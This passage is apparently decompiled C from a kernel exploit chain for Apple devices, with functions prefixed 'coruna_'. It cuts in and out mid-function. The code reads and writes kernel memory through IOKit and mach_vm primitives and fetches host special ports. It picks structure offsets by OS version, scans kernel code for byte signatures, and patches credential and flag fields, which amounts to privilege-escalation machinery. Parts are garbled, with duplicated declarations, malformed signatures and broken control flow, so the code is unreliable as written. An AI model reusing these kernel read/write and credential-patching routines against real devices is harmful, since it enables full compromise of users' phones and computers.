        (kind = coruna_kernel29bb0_trampoline_0001a670(arg,addr,tmp_buf), (int)kind != 0)) &&
       (kind = coruna_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_9(arg,n,1), (int)kind != 0)) {
      coruna_kernel29bb0_via_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_4(arg,serial_11);
      err = coruna_call_mach_vm_machine_attribute_29df8_1aa8c(arg,addr,serial_11);
      kind = (unsigned long)(err != 0);
    }
    return kind;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  kind = coruna_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_9(arg,n,0);
  return kind;
}





bool coruna_pthread_join_2ec18(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  uint u;
  int err;
  pthread_t scratch;
  
  scratch = (pthread_t)0x0;
  u = coruna_pthread_attr_setdetachstate_2e9c4(val,&scratch,id_2,size_3);
  if (u == 0) {
    err = _pthread_join(scratch,(void **)0x0);
    u = (uint)(err != 0);
  }
  return u == 0;
}





uint64_t coruna_getuid(long handle,uint size,int flags,int count_2)
{
  uint8_t *ptr;
  uid_t u;
  int err;
  long handle;
  uint64_t size;
  uint scratch;
  uint scratch;
  uint bootargs;
  uint32_t thread_attr;
  int bootargs;
  uint32_t host_info;
  uint64_t serial_buf;
  uint64_t thread_attr;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t host_info;
  uint64_t sa_saved;
  int serial_buf;
  int action;
  uint64_t block_ctx;
  uint64_t sa_new;
  uint32_t path_buf;
  uint64_t stack_guard;
  uint32_t tmp_buf;
  uint64_t region;
  uint64_t sa_saved;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t sa_new;
  uint64_t frame;
  int path_buf;
  uint8_t tmp_buf[28];
  uint region;
  long plist;
  long url_buf;
  long json_buf;
  unsigned long frame;
  
  u = _getuid();
  ptr = k_kernel_mach_task_self_slot;
  handle = coruna_kernel29bb0_via_kernel29bb0_via_return_zero_1f078_2(handle,*(uint32_t *)k_kernel_mach_task_self_slot,0);
  if (handle == 0) {
    return 0;
  }
  size = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,handle + 0x68,4,&path_buf);
  if ((int)size == 0) {
    return size;
  }
  if ((*(int *)(&k_kernel_slot_1910 + handle) == 0) && (*(int *)(&k_kernel_slot_1914 + handle) == 0)) {
    *(uid_t *)(&k_kernel_slot_1910 + handle) = u;
    *(int *)(&k_kernel_slot_1914 + handle) = path_buf;
  }
  if ((u == size) && (path_buf == flags)) {
    return 1;
  }
  if (count_2 == 0) {
    err = coruna_ctx_test_flag(handle,4);
    if (err != 0) {
      return 0;
    }
    handle = *(long *)(&k_kernel_slot_18e0 + handle);
    if (handle != 0) goto fail;
  }
  block_ctx = 0;
  handle = coruna_kernel29bb0_via_kernel29bb0_via_return_zero_1f078_2(handle,*(uint32_t *)ptr,&block_ctx);
  if (handle == 0) {
    return 0;
  }
  if (*(long *)(&k_kernel_slot_18e0 + handle) == 0) {
    *(long *)(&k_kernel_slot_18e0 + handle) = handle;
    *(uint64_t *)(&k_kernel_slot_18e8 + handle) = block_ctx;
  }
fail:
  size = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,handle + 0x18,0x58,&block_ctx);
  if ((int)size == 0) {
    return size;
  }
  serial_buf = region;
  action = plist;
  thread_attr = sa_saved;
  stack_guard = json_buf;
  block_ctx = url_buf;
  sa_saved = frame;
  host_info = sa_new;
  _local_160 = coruna_u64_pack((size), (size));
  _uStack_158 = coruna_u64_pack((path_buf), (size));
  _local_150 = coruna_u64_pack((tmp_buf), (flags));
  serial_buf = flags;
  action = flags;
  err = _memcmp(&scratch,&block_ctx,0x58);
  if ((err != 0) && (size = coruna_call_mach_vm_machine_attribute_29df8_1acd4(handle,handle + 0x18,&scratch,0x58), (int)size == 0))
  {
    return size;
  }
  frame = coruna_helper_17db8_202d0(handle,*(uint32_t *)ptr);
  if (frame != 0) {
    err = *(int *)(handle + 0x140);
    if (err < 0x2258) {
      if (err - 0x1f53U < 2) {
        handle = 0xb0;
      }
      else if (err == 0x1809) {
        handle = 200;
      }
      else {
        if (err != 0x1c1b) {
          return 0;
        }
        handle = 0xb8;
      }
    }
    else {
      if (((err != 0x2258) && (err != 0x225c)) && (err != 0x2712)) {
        return 0;
      }
      handle = 0xa8;
    }
    err = coruna_kernel29bb0_trampoline_0001a670(handle,handle + frame,&frame);
    if (err != 0) {
      if (frame == 0) {
        err = coruna_ctx_test_flag(handle,0x5584001);
        if (err == 0) {
          handle = coruna_return_zero_154a0(handle,0);
          if (((handle != 0) &&
              (err = coruna_open_m2scaler_124f4(handle,handle,size,1,0,0,&frame), err != 0)) &&
             (err = coruna_open_m2scaler_124f4(handle,handle,u,0xffffffffffffffff,0,0,&frame), err != 0
             )) {
            return 1;
          }
        }
        else {
          handle = *(long *)(&k_kernel_slot_1990 + handle);
          if (handle == 0) {
            coruna_macho_text_sect(tmp_buf,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
            handle = coruna_strsep(tmp_buf,"00 7D 04 13 .. .. .. .. .. .. .. .. 21 05 80 52",0,1);
            if (handle == 0) {
              return 0;
            }
            handle = coruna_return_zero_1555c_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + 4);
            if (handle == 0) {
              return 0;
            }
            *(long *)(&k_kernel_slot_1990 + handle) = handle;
          }
          err = coruna_kernel29bb0_trampoline_0001a670(handle,handle,&frame);
          if (((err != 0) && (frame < 0x400)) &&
             ((err = coruna_kernel29bb0_trampoline_0001a670(handle,handle + *(int *)(handle + 0x168),&json_buf),
              err != 0 &&
              (((handle = coruna_ptr_canonicalize(handle,json_buf), handle != 0 &&
                (err = coruna_kernel29bb0_trampoline_0001a670(handle,json_buf +
                                                    (frame & size) *
                                                    (long)*(int *)(handle + 0x168),&url_buf),
                err != 0)) && (handle = coruna_ptr_canonicalize(handle,url_buf), handle != 0)))))) {
            while (err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,url_buf + (long)*(int *)(handle + 0x168) * 2,4,
                                        &region), err != 0) {
              if (region == size) {
                err = coruna_kernel29bb0_trampoline_0001a670(handle,url_buf + (long)*(int *)(handle + 0x168) * 3,
                                           &plist);
                if (err == 0) {
                  return 0;
                }
                plist = plist + 4;
                err = coruna_kernel29bb0_residual_167(handle,url_buf + (long)*(int *)(handle + 0x168) * 3);
                if (err == 0) {
                  return 0;
                }
                goto joined_r0x00023db8;
              }
              err = coruna_kernel29bb0_trampoline_0001a670(handle,url_buf,&url_buf);
              if (err == 0) {
                return 0;
              }
              url_buf = coruna_ptr_canonicalize(handle,url_buf);
              if (url_buf == 0) {
                return 0;
              }
            }
          }
        }
      }
      else {
        url_buf = coruna_ptr_canonicalize(handle);
joined_r0x00023db8:
        if (url_buf != 0) {
          return 1;
        }
      }
    }
  }
  return 0;
}





unsigned long coruna_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_6(uint64_t arg,uint64_t val,uint n,uint *m)

{
  int j;
  unsigned long tag;
  uint cache_37;
  
  tag = coruna_kernel29bb0_via_ioconnectcallmethod(arg,val,&cache_37);
  if ((int)tag != 0) {
    if (m != (uint *)0x0) {
      *m = cache_37 & 0x3ff;
    }
    cache_37 = cache_37 & 0xfffffc00 | n & 0x3ff;
    j = coruna_mach_vm_machine_attribute(arg,val);
    tag = (unsigned long)(j != 0);
  }
  return tag;
}





unsigned long coruna_host_get_special_port(long arg)

{
  mach_port_t host_priv;
  kern_return_t lk1;
  unsigned long tag;
  long serial_11;
  uint32_t tmp_buf;
  uint cache_37;
  
  host_priv = _mach_host_self();
  tag = (unsigned long)*(uint *)(&k_kernel_slot_1920 + arg);
  if (*(uint *)(&k_kernel_slot_1920 + arg) + 1 < 2) {
    lk1 = _host_get_special_port(host_priv,-1,2,&cache_37);
    if (lk1 == 0) {
      tag = (unsigned long)cache_37;
    }
    else {
      serial_11 = coruna_ret_stub_2(arg,host_priv);
      tag = 0;
      if ((serial_11 != 0) && (tag = coruna_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_6(arg,serial_11,4,&tmp_buf), (int)tag != 0)) {
        lk1 = _host_get_special_port(host_priv,-1,2,&cache_37);
        coruna_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_6(arg,serial_11,tmp_buf,0);
        if (lk1 != 0) {
          cache_37 = 0;
        }
        tag = (unsigned long)cache_37;
      }
    }
  }
  return tag;
}
uint64_t coruna_return_zero_23f00(long handle,uint64_t val)
{
  int err;
  long handle;
  uint64_t u;
  unsigned long *ptr;
  unsigned long scratch;
  unsigned long bootargs [4];
  long thread_attr;
  
  ptr = &scratch;
  err = coruna_ctx_test_flag(handle,0x20);
  if (err != 0) {
    handle = coruna_kernel29bb0_via_return_zero_2019c(handle,val);
    if (handle == 0) {
      return 0;
    }
    u = coruna_kernel29bb0_trampoline_0001a670(handle,handle + 0xb0,&thread_attr);
    if ((int)u == 0) {
      return u;
    }
    handle = coruna_ptr_canonicalize(handle,thread_attr);
    if (handle == 0) {
      return 0;
    }
    u = coruna_kernel29bb0_trampoline_0001a670(handle,thread_attr + 0x50,bootargs + 3);
    if ((int)u == 0) {
      return u;
    }
    if (((bootargs[3] != 0) && (handle = *(long *)(handle + 0x128), handle != 0)) &&
       (bootargs[3] != handle)) {
      bootargs[1] = 0;
      bootargs[2] = 0;
      scratch = 0;
      bootargs[0] = 0;
      err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,handle + 0x28,8,bootargs);
      if (((err != 0) &&
          (err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,*(long *)(handle + 0x128) + 0x30,8,&scratch), err != 0))
         && ((err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,bootargs[3] + 0x28,8,bootargs + 2), err != 0 &&
             (err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,bootargs[3] + 0x30,8,bootargs + 1), err != 0)))) {
        if (bootargs[0] < bootargs[2]) {
          handle = bootargs[3] + 0x28;
          ptr = bootargs;
        }
        else {
          handle = bootargs[3] + 0x30;
        }
        err = coruna_return_zero_d6bc(handle,handle,ptr,8);
        if (err != 0) {
          return 1;
        }
      }
      return 0;
    }
  }
  return 1;
}





uint64_t coruna_return_zero_24050(long handle,uint64_t val,int flags)
{
  bool err;
  int err;
  uint64_t u;
  long handle;
  long addr;
  long scratch;
  unsigned long bootargs;
  uint thread_attr;
  
  thread_attr = 0;
  u = coruna_return_zero_26090();
  if ((int)u == 0) {
    return u;
  }
  if (flags == 0) {
    err = coruna_ctx_test_flag(handle,0x20);
    if (err == 0) {
      err = coruna_ctx_test_flag(handle,0x5184001);
      if (err != 0) {
        bootargs = 0;
        err = *(int *)(handle + 0x140);
        if (err < 0x2712) {
          if (0x1f52 < err) {
            err = coruna_ctx_test_flag(handle,0x1180000);
            err = err == 0;
            handle = 0xa0;
            addr = 0x98;
            if (!err) {
            addr = handle;
            }
            }
            handle = coruna_kernel29bb0_via_return_zero_2019c(handle,val);
            if (handle == 0) {
            return 0;
          }
          if (0x1c1a < err) {
            err = coruna_ctx_test_flag(handle,0x80000);
            err = err == 0;
            handle = 0xe0;
            addr = 0xd8;
            if (!err) {
            addr = handle;
            }
            }
            handle = coruna_kernel29bb0_via_return_zero_2019c(handle,val);
            if (handle == 0) {
            return 0;
          }
          addr = 0xe8;
          if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
            addr = 0xf0;
          }
        }
        else {
          err = coruna_ctx_test_flag(handle,0x1180000);
          err = err == 0;
          handle = 0xa8;
          addr = 0xa0;
fail:
          if (!err) {
            addr = handle;
          }
        }
        handle = coruna_kernel29bb0_via_return_zero_2019c(handle,val);
        if (handle == 0) {
          return 0;
        }
        handle = handle + addr;
        err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,handle,8,&bootargs);
        if (err == 0) {
          return 0;
        }
        if (bootargs != 0) {
          scratch = 0;
          if ((*(unsigned long *)k_kernel_vm_page_mask_slot & bootargs) != 0) {
            return 0;
          }
          err = coruna_return_zero_d6bc(handle,handle,&scratch,8);
          if (err == 0) {
            return 0;
          }
          u = coruna_return_zero_d6bc(handle,handle + 8,&scratch,8);
          if ((int)u == 0) {
            return u;
          }
        }
      }
    }
    else {
      addr = coruna_kernel29bb0_via_return_zero_2019c(handle,val);
      if (addr == 0) {
        return 0;
      }
      err = coruna_kernel29bb0_trampoline_0001a670(handle,addr + 0xb0,&bootargs);
      if (err == 0) {
        return 0;
      }
      addr = coruna_ptr_canonicalize(handle,bootargs);
      if (addr == 0) {
        return 0;
      }
      err = coruna_kernel29bb0_trampoline_0001a670(handle,bootargs + 0x50,&scratch);
      if (err == 0) {
        return 0;
      }
      if (scratch != 0) {
        *(long *)(handle + 0x128) = scratch;
        scratch = 0;
        err = coruna_return_zero_d6bc(handle,bootargs + 0x50,&scratch,*(uint32_t *)(handle + 0x168));
        if (err == 0) {
          return 0;
        }
      }
    }
  }
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    addr = 0x10c;
    if ((err != 0x1809) && (err != 0x1c1b)) {
      if (err != 0x1f53) {
        return 0;
      }
      addr = 0x11c;
    }
  }
  else {
    if (err < 0x225c) {
      if (err == 0x1f54) {
        addr = 0x94;
        handle = coruna_return_zero_2019c(handle,val);
        if (handle == 0) {
        return 0;
        }
        u = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,handle + addr,4,&thread_attr);
        if ((int)u != 0) {
        thread_attr = thread_attr & 0xfffff800 | thread_attr & 0x3ff | (uint)(flags != 0) << 10;
        u = coruna_call_mach_vm_machine_attribute_29df8_1aa94(handle,handle + addr,&thread_attr,4);
        return u;
        }
        return u;
      }
      if (err != 0x2258) {
        return 0;
      }
    }
    else if (err != 0x225c) {
      if (err != 0x2712) {
        return 0;
      }
      addr = 200;
      handle = coruna_return_zero_2019c(handle,val);
      if (handle == 0) {
      return 0;
      }
      u = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,handle + addr,4,&thread_attr);
      if ((int)u != 0) {
      thread_attr = thread_attr & 0xfffff800 | thread_attr & 0x3ff | (uint)(flags != 0) << 10;
      u = coruna_call_mach_vm_machine_attribute_29df8_1aa94(handle,handle + addr,&thread_attr,4);
      return u;
      }
      return u;
    }
    addr = 0xb4;
  }
done:
  handle = coruna_return_zero_2019c(handle,val);
  if (handle == 0) {
    return 0;
  }
  u = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,handle + addr,4,&thread_attr);
  if ((int)u != 0) {
    thread_attr = thread_attr & 0xfffff800 | thread_attr & 0x3ff | (uint)(flags != 0) << 10;
    u = coruna_call_mach_vm_machine_attribute_29df8_1aa94(handle,handle + addr,&thread_attr,4);
    return u;
  }
  return u;
}





uint64_t coruna_return_zero_3307c(long handle)
{
  uint u;
  int err;
  long handle;
  long addr;
  uint scratch;
  
  handle = coruna_helper_17db8_202d0();
  if (handle != 0) {
    err = *(int *)(handle + 0x140);
    if (err < 0x1f54) {
      if (err == 0x1809) {
        addr = 0x3c0;
      }
      else if (err == 0x1c1b) {
        addr = 0x3a8;
      }
      else {
        if (err != 0x1f53) {
          return 0;
        }
        addr = 0x4d0;
        if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
          addr = 0x430;
        }
      }
    }
    else if (err < 0x225c) {
      if (err == 0x1f54) {
        addr = 0x4c8;
      }
      else {
        if (err != 0x2258) {
          return 0;
        }
        addr = 0x4ac;
      }
    }
    else {
      if ((err != 0x225c) && (err != 0x2712)) {
        return 0;
      }
      addr = 0x6a4;
    }
    err = coruna_kernel29bb0_via_ioconnectcallmethod(handle,addr + handle,&scratch);
    if ((err != 0) && ((scratch & 0xff000000) == 0)) {
      u = scratch & 0xfff71fdf | 0x80000;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
        u = scratch | 0x20;
      }
      if ((scratch == (u & 0xffff1fff)) ||
         (scratch = u & 0xffff1fff, err = coruna_mach_vm_machine_attribute(handle,addr + handle), err != 0)) {
        return 1;
      }
    }
  }
  return 0;
}





uint64_t
void coruna_return_zero_2f870(long handle,uint64_t val,uint size,unsigned long arg,uint64_t id_2)
{
  uint u;
  bool err;
  int err;
  long handle;
  uint64_t size;
  long addr;
  long off;
  long base;
  uint version;
  uint port;
  uint tag;
  uint kind;
  void *ptr;
  unsigned long type_id;
  unsigned long type_id_8;
  unsigned long type_id_9;
  uint64_t type_id_10;
  uint64_t type_id_11;
  long scratch;
  byte bootargs;
  uint8_t thread_attr;
  uint64_t host_info;
  long serial_buf [3];
  byte action;
  int block_ctx;
  byte stack_guard;
  uint64_t scratch;
  
  host_info = 0;
  handle = coruna_kernel29bb0_via_return_zero_2019c();
  if (handle == 0) {
    return 0;
  }
  err = coruna_ctx_test_flag(handle,0x20);
  kind = (uint)id_2;
  tag = (uint)arg;
  if (err == 0) {
    err = coruna_ctx_test_flag(handle,0x5184001);
    if (err == 0) {
      size = coruna_ctx_test_flag(handle,0x200);
      if ((int)size == 0) {
        return size;
      }
      err = *(int *)(handle + 0x140);
      if (err < 0x2258) {
        if (err < 0x1f53) {
          if (err < 0x1c1b) {
            if (err < 0x1809) {
              return 0;
            }
            addr = 0xe7;
            if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
              addr = 0xef;
            }
          }
          else {
            addr = 0xdf;
          }
        }
        else {
          addr = 0x97;
        }
      }
      else {
        addr = 0x8f;
      }
      size = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,addr + handle,1,(long)&host_info + 4);
      if ((int)size == 0) {
        return size;
      }
      host_info = coruna_u64_pack((host_info), (kind));
      if (host_info == kind) {
        return 1;
      }
      size = coruna_call_mach_vm_machine_attribute_29df8_1aa94(handle,addr + handle,&host_info,1);
      err = (int)size;
      if (err != 0) {
      return 1;
      }
      return size;
    }
    err = *(int *)(handle + 0x140);
    if (err < 0x2712) {
      if (0x2257 < err) {
        err = coruna_ctx_test_flag(handle,0x1180000);
        err = err == 0;
        off = 0xbf;
        addr = 0xb7;
        if (!err) {
        addr = off;
        }
        }
        size = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,addr + handle,4,(long)&host_info + 4);
        if ((int)size == 0) {
        return size;
      }
      if (0x1f52 < err) {
        size = 0x180000;
        err = coruna_ctx_test_flag(handle,size);
        err = err == 0;
        off = 199;
        addr = 0xbf;
        if (!err) {
        addr = off;
        }
        }
        size = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,addr + handle,4,(long)&host_info + 4);
        if ((int)size == 0) {
        return size;
      }
      if (0x1c1a < err) {
        err = coruna_ctx_test_flag(handle,0x80000);
        err = err == 0;
        off = 0x107;
        addr = 0xff;
        if (!err) {
        addr = off;
        }
        }
        size = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,addr + handle,4,(long)&host_info + 4);
        if ((int)size == 0) {
        return size;
      }
      addr = 0x107;
      if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
        addr = 0x10f;
      }
    }
    else {
      size = 0x1180000;
done:
      err = coruna_ctx_test_flag(handle,size);
      err = err == 0;
      off = 199;
      addr = 0xbf;
fail:
      if (!err) {
        addr = off;
      }
    }
    size = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,addr + handle,4,(long)&host_info + 4);
    if ((int)size == 0) {
      return size;
    }
    version = 0xff00;
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b0a80100000) {
      version = 0xff000000;
    }
    port = 0x10000;
    u = 0x1000000;
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b0a80100000) {
      port = 0x100;
      u = 0x10000;
    }
    if (tag == 0) {
      u = 0;
    }
    if (size == 0) {
      port = 0;
    }
    kind = u | port | kind | host_info & version;
    host_info = coruna_u64_pack((host_info), (kind));
    if ((host_info != kind) &&
       (size = coruna_return_zero_d6bc(handle,addr + handle,&host_info,4), (int)size == 0)) {
      return size;
    }
    if (*(int *)(handle + 0x140) < 0x1f53) {
      arg = (unsigned long)(size ^ 1 | tag);
    }
    if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
      size = coruna_kernel29bb0_via_wire_map_lookup_2(handle,val,arg,id_2);
      err = (int)size;
      goto joined_r0x0002482c;
    }
  }
  else {
    size = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,handle + 0x92,1,&bootargs);
    if ((int)size == 0) {
      return size;
    }
    if (bootargs != kind) {
      thread_attr = (uint8_t)id_2;
      size = coruna_call_mach_vm_machine_attribute_29df8_1aa94(handle,handle + 0x92,&thread_attr,1);
      if ((int)size == 0) {
        return size;
      }
      if (kind != 0) {
        size = coruna_kernel29bb0_trampoline_0001a670(handle,handle + *(int *)(handle + 0x168),&scratch);
        if ((int)size == 0) {
          return size;
        }
        ptr = *(void **)(&k_kernel_slot_1d30 + handle);
        if (ptr == (void *)0x0) {
          coruna_return_zero_30860_230e0(handle,0,0,0);
          if (*(int *)(&k_kernel_slot_18a0 + handle) != 0) {
            type_id = 0;
            do {
              addr = handle + type_id * 0x18;
              off = *(long *)(&k_kernel_slot_1a10 + addr);
              type_id_9 = *(unsigned long *)(&k_kernel_slot_1a18 + addr);
              addr = coruna_ptr_canonicalize(handle,off);
              if (addr != 0 && type_id_9 != 0) {
                err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,off + 8,8,&stack_guard);
                if (err == 0) {
                  return 0;
                }
                if (coruna_u64_pack71((scratch), (stack_guard)) == 0x6f74616c75676572) {
                  type_id_8 = 0;
                  do {
                    addr = type_id_8 + off;
                    err = coruna_kernel29bb0_via_ioconnectcallmethod(handle,addr,&block_ctx);
                    if (err == 0) break;
                    if (block_ctx == -0x1120531) {
                      if (addr == 0) {
                        return 0;
                      }
                      ptr = _calloc(0x128,1);
                      if (ptr == (void *)0x0) {
                        return 0;
                      }
                      coruna_ctx_clear_1090c(ptr,handle);
                      size = *(uint64_t *)(handle + 0x140);
                      type_id_11 = *(uint64_t *)(handle + 0x158);
                      type_id_10 = *(uint64_t *)(handle + 0x150);
                      *(uint64_t *)((long)ptr + 0x78) = *(uint64_t *)(handle + 0x148);
                      *(uint64_t *)((long)ptr + 0x70) = size;
                      *(uint64_t *)((long)ptr + 0x88) = type_id_11;
                      *(uint64_t *)((long)ptr + 0x80) = type_id_10;
                      *(uint64_t *)((long)ptr + 0x90) = *(uint64_t *)(handle + 0x160);
                      *(uint32_t *)((long)ptr + 0x98) = *(uint32_t *)(handle + 0x178);
                      *(uint32_t *)((long)ptr + 0x38) = *(uint32_t *)(handle + 0x180);
                      err = coruna_call_find_text_exec(ptr,0,addr,0);
                      if (err == 0) {
                        return 0;
                      }
                      *(void **)(&k_kernel_slot_1d30 + handle) = ptr;
                      coruna_macho_text_sect(serial_buf,ptr);
                      addr = coruna_strsep(serial_buf,"68 02 08 CB 1F 20 03 D5",0,1);
                      if (addr == 0) {
                      return 0;
                      }
                      off = coruna_return_zero_1555c_stub(*(uint64_t *)(&k_kernel_slot_1d30 + handle),addr + -8);
                      if (off == 0) {
                      return 0;
                      }
                      off = coruna_kernel29bb0_trampoline_00010cac(*(uint64_t *)(&k_kernel_slot_1d30 + handle),off);
                      base = coruna_ptr_canonicalize(handle,off);
                      if (base == 0) {
                      return 0;
                      }
                      addr = coruna_return_zero_1555c_stub(*(uint64_t *)(&k_kernel_slot_1d30 + handle),addr + 4);
                      if (addr == 0) {
                      return 0;
                      }
                      addr = coruna_kernel29bb0_trampoline_00010cac(*(uint64_t *)(&k_kernel_slot_1d30 + handle),addr);
                      if (addr == 0) {
                      return 0;
                      }
                      addr = off + ((unsigned long)(scratch - addr) >> 10 & 0x3ffffffffffff0) + 9;
                      err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,addr,1,&action);
                      if (err == 0) {
                      return 0;
                      }
                      if ((action & 1) == 0) {
                      action = action | 1;
                      err = coruna_vm_deallocate_f7f8(handle,addr,&action,1);
                      if (err == 0) {
                      return 0;
                      }
                      }
                      }
                      }
                      size = coruna_kernel29bb0_trampoline_0001a670(handle,handle + 0xb0,serial_buf);
                      if ((int)size == 0) {
                      return size;
                      }
                      handle = coruna_ptr_canonicalize(handle,serial_buf[0]);
                      if (handle == 0) {
                      return 0;
                      }
                      size = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,serial_buf[0] + 0x20,1,&stack_guard);
                      if ((int)size == 0) {
                      return size;
                      }
                      thread_attr = (uint8_t)arg;
                      if (stack_guard != tag) {
                      size = coruna_vm_deallocate_f7f8(handle,serial_buf[0] + 0x20,&thread_attr,1);
                      err = (int)size;
                      joined_r0x0002482c:
                      if (err == 0) {
                      return size;
                    }
                    type_id_8 = type_id_8 + *(uint *)(handle + 0x180);
                  } while (type_id_8 < type_id_9);
                }
              }
              type_id = type_id + 1;
            } while (type_id < *(uint *)(&k_kernel_slot_18a0 + handle));
          }
          return 0;
        }
cleanup:
        coruna_macho_text_sect(serial_buf,ptr);
        addr = coruna_strsep(serial_buf,"68 02 08 CB 1F 20 03 D5",0,1);
        if (addr == 0) {
          return 0;
        }
        off = coruna_return_zero_1555c_stub(*(uint64_t *)(&k_kernel_slot_1d30 + handle),addr + -8);
        if (off == 0) {
          return 0;
        }
        off = coruna_kernel29bb0_trampoline_00010cac(*(uint64_t *)(&k_kernel_slot_1d30 + handle),off);
        base = coruna_ptr_canonicalize(handle,off);
        if (base == 0) {
          return 0;
        }
        addr = coruna_return_zero_1555c_stub(*(uint64_t *)(&k_kernel_slot_1d30 + handle),addr + 4);
        if (addr == 0) {
          return 0;
        }
        addr = coruna_kernel29bb0_trampoline_00010cac(*(uint64_t *)(&k_kernel_slot_1d30 + handle),addr);
        if (addr == 0) {
          return 0;
        }
        addr = off + ((unsigned long)(scratch - addr) >> 10 & 0x3ffffffffffff0) + 9;
        err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,addr,1,&action);
        if (err == 0) {
          return 0;
        }
        if ((action & 1) == 0) {
          action = action | 1;
          err = coruna_vm_deallocate_f7f8(handle,addr,&action,1);
          if (err == 0) {
            return 0;
          }
        }
      }
    }
    size = coruna_kernel29bb0_trampoline_0001a670(handle,handle + 0xb0,serial_buf);
    if ((int)size == 0) {
      return size;
    }
    handle = coruna_ptr_canonicalize(handle,serial_buf[0]);
    if (handle == 0) {
      return 0;
    }
    size = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,serial_buf[0] + 0x20,1,&stack_guard);
    if ((int)size == 0) {
      return size;
    }
    thread_attr = (uint8_t)arg;
    if (stack_guard != tag) {
      size = coruna_vm_deallocate_f7f8(handle,serial_buf[0] + 0x20,&thread_attr,1);
      err = (int)size;
joined_r0x0002482c:
      if (err == 0) {
        return size;
      }
    }
  }
  if (*(double *)k_kernel_dyldversionnumber_slot < k_kernel_rodata_word_2af50) {
    return 1;
  }
  size = coruna_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_7(handle,val,arg);
  err = (int)size;
joined_r0x00024a30:
  if (err != 0) {
    return 1;
  }
  return size;
}





uint64_t coruna_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_7(uint64_t val,uint64_t id_2,int flags)
{
  long handle;
  uint64_t u;
  uint size;
  uint scratch;
  
  handle = coruna_return_zero_211b0();
  u = 0;
  if ((handle != 0) && (u = coruna_kernel29bb0_via_ioconnectcallmethod(val,handle,&scratch), (int)u != 0)) {
    size = 0x80;
    if (flags == 0) {
      size = 0;
    }
    if (((scratch & 0xffffff7f | size) == scratch) ||
       (u = coruna_kernel29bb0_trampoline_0001a360(val,handle), (int)u != 0)) {
      u = 1;
    }
  }
  return u;
}





uint64_t
void coruna_return_zero_24b48(long handle,uint64_t val,uint8_t *buf,uint8_t *data_2,
            uint8_t *bytes_3)
{
  bool err;
  int err;
  long handle;
  uint64_t u;
  long addr;
  long off;
  unsigned long size;
  char scratch;
  long bootargs;
  uint thread_attr;
  
  thread_attr = 0;
  handle = coruna_kernel29bb0_via_return_zero_2019c();
  if (handle == 0) {
    return 0;
  }
  err = coruna_ctx_test_flag(handle,0x20);
  if (err != 0) {
    err = coruna_kernel29bb0_trampoline_0001a670(handle,handle + 0xb0,&bootargs);
    if (err == 0) {
      return 0;
    }
    handle = coruna_ptr_canonicalize(handle,bootargs);
    if (handle == 0) {
      return 0;
    }
    err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,bootargs + 0x20,1,&scratch);
    if (err == 0) {
      return 0;
    }
    *data_2 = scratch != '\0';
    *bytes_3 = 0;
    *buf = 1;
    return 1;
  }
  err = coruna_ctx_test_flag(handle,0x5184001);
  if (err == 0) {
    err = coruna_ctx_test_flag(handle,0x200);
    if (err == 0) {
      return 0;
    }
    err = *(int *)(handle + 0x140);
    if (err < 0x2258) {
      if (err < 0x1f53) {
        if (err < 0x1c1b) {
          if (err < 0x1809) {
            return 0;
          }
          off = 0xe7;
          if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
            off = 0xef;
          }
        }
        else {
          off = 0xdf;
        }
      }
      else {
        off = 0x97;
      }
    }
    else {
      off = 0x8f;
    }
    err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,off + handle,1,&thread_attr);
    if (err != 0) {
      *bytes_3 = (char)thread_attr != '\0';
      *data_2 = 0;
      *buf = 0;
      return 1;
    }
    return 0;
  }
  err = *(int *)(handle + 0x140);
  if (err < 0x2712) {
    if (err < 0x2258) {
      if (0x1f52 < err) {
        u = 0x180000;
        err = coruna_ctx_test_flag(handle,u);
        err = err == 0;
        addr = 199;
        off = 0xbf;
        }
        if (!err) {
        off = addr;
        }
        done:
        err = coruna_kernel29bb0_via_ioconnectcallmethod(handle,off + handle,&thread_attr);
        if (err == 0) {
        return 0;
